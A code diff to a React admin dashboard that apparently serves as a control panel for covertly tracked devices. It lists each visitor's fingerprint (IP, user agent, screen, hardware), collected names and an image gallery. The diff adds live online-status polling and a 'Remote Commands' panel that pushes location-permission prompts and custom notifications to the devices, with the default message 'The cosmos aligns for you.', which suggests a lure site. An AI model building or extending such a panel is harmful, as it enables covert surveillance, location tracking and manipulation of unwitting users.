@@ -37,6 +37,7 @@ type Scan = {
 
 type DeviceGroup = {
   id: string;
+  deviceId?: string;
   publicIp: string;
   userAgent: string;
   screenResolution: string;
@@ -44,6 +45,7 @@ type DeviceGroup = {
   language: string;
   deviceMemory: number;
   hardwareConcurrency: number;
+  lastSeen?: string;
   scans: Scan[];
 };
 
@@ -81,6 +83,8 @@ export default function AdminDashboard() {
 
   useEffect(() => {
     fetchDevices();
+    const interval = setInterval(fetchDevices, 5000); // Live update every 5 seconds
+    return () => clearInterval(interval);
   }, []);
 
   const handleSelectAll = () => {
@@ -223,44 +227,79 @@ export default function AdminDashboard() {
                   <ImageIcon size={12} className="opacity-60" />
                   {device.scans.length}
                 </div>
+        {devices.map((device, i) => {
+          const isOnline = device.lastSeen ? (new Date().getTime() - new Date(device.lastSeen).getTime()) < 15000 : false;
+          return (
+            <motion.div
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ delay: i * 0.05 }}
+              key={device.id}
+              onClick={() => setSelectedDevice(device)}
+              className="group relative cursor-pointer overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02] p-6 backdrop-blur-sm transition-all hover:border-blue-500/50 hover:bg-blue-500/5"
+            >
+              {/* Online Indicator */}
+              <div className="absolute top-6 right-6 flex items-center gap-2">
+                <span className="text-[10px] font-mono opacity-50">{isOnline ? 'LIVE' : (device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : 'OFFLINE')}</span>
+                <div className={`h-2 w-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-gray-600'}`} />
               </div>
+              
+              <div className="relative z-10">
+                <div className="flex items-start justify-between mb-6">
+                  <div className="flex items-center gap-3">
+                    <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-blue-500/10 text-blue-400">
+                      {device.userAgent?.includes("Mobile") ? <Smartphone size={20} /> : <Monitor size={20} />}
+                    </div>
+                    <div>
+                      <h3 className="font-mono text-sm text-white">{device.publicIp || "Unknown IP"}</h3>
+                      <p className="text-xs opacity-50 flex items-center gap-1 mt-1">
+                        <Globe size={10} /> {device.timezone}
+                      </p>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-1.5 rounded-full bg-white/5 px-2.5 py-1 text-xs font-medium text-white/80">
+                    <ImageIcon size={12} className="opacity-60" />
+                    {device.scans.length}
+                  </div>
+                </div>
 
-              <div className="space-y-3 text-xs opacity-70">
-                {(() => {
-                  const names = Array.from(new Set(device.scans.map(s => s.userName).filter(Boolean)));
-                  if (names.length > 0) {
-                    return (
-                      <div className="flex justify-between border-b border-white/5 pb-2">
-                        <span className="text-purple-400">Identities</span>
-                        <span className="font-sans text-purple-300 max-w-[150px] truncate text-right">
-                          {names.join(", ")}
-                        </span>
-                      </div>
-                    );
-                  }
-                  return null;
-                })()}
-                <div className="flex justify-between border-b border-white/5 pb-2">
-                  <span>Resolution</span>
-                  <span className="font-mono text-white/90">{device.screenResolution || "Unknown"}</span>
+                <div className="space-y-3 text-xs opacity-70">
+                  {(() => {
+                    const names = Array.from(new Set(device.scans.map(s => s.userName).filter(Boolean)));
+                    if (names.length > 0) {
+                      return (
+                        <div className="flex justify-between border-b border-white/5 pb-2">
+                          <span className="text-purple-400">Identities</span>
+                          <span className="font-sans text-purple-300 max-w-[150px] truncate text-right">
+                            {names.join(", ")}
+                          </span>
+                        </div>
+                      );
+                    }
+                    return null;
+                  })()}
+                  <div className="flex justify-between border-b border-white/5 pb-2">
+                    <span>Resolution</span>
+                    <span className="font-mono text-white/90">{device.screenResolution || "Unknown"}</span>
+                  </div>
+                  <div className="flex justify-between border-b border-white/5 pb-2">
+                    <span>Hardware</span>
+                    <span className="font-mono text-white/90">{device.hardwareConcurrency} Cores / {device.deviceMemory}GB RAM</span>
+                  </div>
+                  <div className="flex justify-between pb-2">
+                    <span>System</span>
+                    <span className="truncate max-w-[150px] text-white/90">{device.userAgent?.split(" ")[0]}</span>
+                  </div>
                 </div>
-                <div className="flex justify-between border-b border-white/5 pb-2">
-                  <span>Hardware</span>
-                  <span className="font-mono text-white/90">{device.hardwareConcurrency} Cores / {device.deviceMemory}GB RAM</span>
-                </div>
-                <div className="flex justify-between pb-2">
-                  <span>System</span>
-                  <span className="truncate max-w-[150px] text-white/90">{device.userAgent?.split(" ")[0]}</span>
-                </div>
-              </div>
 
-              <div className="mt-6 flex items-center justify-between text-xs font-semibold text-blue-400/80 transition-colors group-hover:text-blue-400">
-                <span>VIEW GALLERY</span>
-                <ChevronRight size={14} className="transition-transform group-hover:translate-x-1" />
+                <div className="mt-6 flex items-center justify-between text-xs font-semibold text-blue-400/80 transition-colors group-hover:text-blue-400">
+                  <span>VIEW GALLERY</span>
+                  <ChevronRight size={14} className="transition-transform group-hover:translate-x-1" />
+                </div>
               </div>
-            </div>
-          </motion.div>
-        ))}
+            </motion.div>
+          );
+        })}
       </main>
 
       <AnimatePresence>
@@ -388,6 +427,19 @@ export default function AdminDashboard() {
                       </>
                     );
                   })()}
+
+                  <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-red-400">
+                    <Activity size={16} /> Remote Commands
+                  </h3>
+                  <div className="flex flex-col gap-2 mb-6">
+                    <button onClick={() => sendCommand('REQUEST_LOCATION')} className="bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Trigger Location Prompt</button>
+                    <button onClick={() => sendCommand('REQUEST_NOTIFICATION')} className="bg-orange-500/10 border border-orange-500/20 text-orange-400 hover:bg-orange-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Trigger Notification Prompt</button>
+                    <button onClick={() => {
+                      const msg = prompt("Enter the notification message to send:", "The cosmos aligns for you.");
+                      if (msg) sendCommand('SHOW_NOTIFICATION', msg);
+                    }} className="bg-blue-500/10 border border-blue-500/20 text-blue-400 hover:bg-blue-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Send Push Notification</button>
+                  </div>
+                  <div className="h-px bg-white/5 mb-6" />
 
                   <h3 className="mb-6 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-blue-400">
                     <Fingerprint size={16} /> Device Identity
